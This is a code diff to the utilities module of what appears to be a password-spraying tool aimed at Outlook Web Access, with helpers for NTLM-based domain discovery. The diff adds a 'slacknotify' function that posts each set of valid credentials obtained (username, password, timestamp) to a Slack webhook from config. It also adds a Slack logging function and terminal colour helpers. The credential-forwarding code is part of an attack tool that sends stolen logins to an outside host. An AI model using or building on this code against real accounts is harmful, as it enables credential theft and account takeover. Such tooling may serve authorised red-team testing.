@@ -1,6 +1,12 @@
 import random, requests
 from utils.ntlmdecode import ntlmdecode
+import json
+from utils.json_helper import read_json
+from datetime import datetime
 
+# We can set anything up here for easy parsing and access later, for the moment this only houses the slack webhook, can probably add discord and other platforms at a later date as parsing isn't an issue.
+
+configvars = read_json("config-vars")
 
 def generate_ip():
 
@@ -49,3 +55,33 @@ def get_owa_domain(url, uri, useragent):
         return ntlm_info["NetBIOS_Domain_Name"]
     else:
         return "NOTFOUND"
+
+# Function for posting username/password to slack channel
+def slacknotify(username, password):
+    now = datetime.now()
+    webhook_url = configvars["slack_webhook"]
+    message = {"text": '```[Valid Credentials Obtained!]\nUser: ' + username + '\nPass: ' + password + '\nDate: ' + now.strftime("%d-%m-%Y") + '\nTime: ' + now.strftime("%H:%M:%S") + '```'}
+    response = requests.post(
+        webhook_url, data=json.dumps(message),
+        headers={'Content-Type': 'application/json'}
+    )
+
+# Function for debug messages 
+def slacklog(slacklog_msg):
+    now = datetime.now()
+    webhook_url = configvars["slack_webhook"]
+    message = {"text": '```[Log Entry]\n' + slacklog_msg + '\nDate: ' + now.strftime("%d-%m-%Y") + '\nTime: ' + now.strftime("%H:%M:%S") + '```'}
+    response = requests.post(
+        webhook_url, data=json.dumps(message),
+        headers={'Content-Type': 'application/json'}
+    )
+
+# Colour Functions - ZephrFish
+def prRed(skk): 
+    return "\033[91m {}\033[00m" .format(skk)
+
+def prGreen(skk): 
+    return "\033[92m {}\033[00m" .format(skk)
+
+def prYellow(skk): 
+    return "\033[93m {}\033[00m" .format(skk)
